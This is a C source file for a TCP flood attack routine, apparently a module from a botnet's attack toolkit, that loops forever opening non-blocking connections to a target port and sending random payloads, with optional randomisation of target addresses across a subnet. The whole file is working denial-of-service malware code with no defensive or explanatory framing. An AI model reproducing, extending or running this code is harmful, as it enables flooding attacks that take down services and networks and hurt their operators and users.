#define _GNU_SOURCE

#include "../../attack.h"

void flood_tcpbypass(struct flood *connection)
{
    struct sockaddr_in addr;

    addr.sin_family = AF_INET;
    addr.sin_port = htons(connection->settings->dest_port);
    addr.sin_addr.s_addr = connection->targets[0].addr;

    struct state
    {
        int fd;
        int state;
        uint32_t timeout;
    } states[MAX_FDS];

    int clear = 0;

    for (int i = 0; i < MAX_FDS; i++)
    {
        states[i].fd = -1;
        states[i].state = 0;
        states[i].timeout = 0;
    }

    while (TRUE)
    {
        int i = 0;
        fd_set write_set;
        struct timeval timeout;
        int fds = 0;
        socklen_t err = 0;
        int err_len = sizeof(int);

        for (i = 0; i < MAX_FDS; i++)
        {
            switch (states[i].state)
            {
            case 0:
                if ((states[i].fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
                {
                    continue;
                }
                fcntl(states[i].fd, F_SETFL, O_NONBLOCK | fcntl(states[i].fd, F_GETFL, 0));

                errno = 0;
                if (connect(states[i].fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) != -1 || errno != EINPROGRESS)
                {
                    close(states[i].fd);
                    states[i].timeout = 0;
                    continue;
                }
                states[i].state = 1;
                states[i].timeout = time(NULL);
                break;
            case 1:
                FD_ZERO(&write_set);
                FD_SET(states[i].fd, &write_set);

                timeout.tv_usec = 10;
                timeout.tv_sec = 0;

                fds = select(states[i].fd + 1, NULL, &write_set, NULL, &timeout);
                if (fds == 1)
                {
                    getsockopt(states[i].fd, SOL_SOCKET, SO_ERROR, &err, &err_len);

                    if (err)
                    {
                        close(states[i].fd);
                        states[i].state = 0;
                        states[i].timeout = 0;
                        continue;
                    }

                    states[i].state = 2;
                    continue;
                }
                else if (fds == -1)
                {
                    close(states[i].fd);
                    states[i].state = 0;
                    states[i].timeout = 0;
                }

                if (states[i].timeout + 5 < time(NULL))
                {
                    close(states[i].fd);
                    states[i].state = 0;
                    states[i].timeout = 0;
                }
                break;
            case 2:
                if (connection->settings->payload == NULL)
                {
                    if (connection->settings->min_length > 0 && connection->settings->max_length > 0)
                        connection->settings->length = rand_next_range(connection->settings->min_length, connection->settings->max_length);

                    connection->settings->payload = (char *)malloc(connection->settings->length);
                    rand_str(connection->settings->payload, connection->settings->length);
                }

                // Randomize destination address if the netmask is below 32 to add subnet support.
                if (connection->targets[0].netmask < 32)
                    connection->targets[0].sock_addr.sin_addr.s_addr = htonl(ntohl(connection->targets[0].addr) + (((uint32_t)rand_next()) >> connection->targets[0].netmask));

                if (send(states[i].fd, connection->settings->payload, connection->settings->length, MSG_NOSIGNAL) == -1 && errno != EAGAIN) // Finished send
                {
                    close(states[i].fd);
                    states[i].state = 0;
                    states[i].timeout = 0;

                    // Randomize destination address if the netmask is below 32 to add subnet support.
                    if (connection->targets[0].netmask < 32)
                        connection->targets[0].sock_addr.sin_addr.s_addr = htonl(ntohl(connection->targets[0].addr) + (((uint32_t)rand_next()) >> connection->targets[0].netmask));
                }

                break;
            }
        }
    }
}
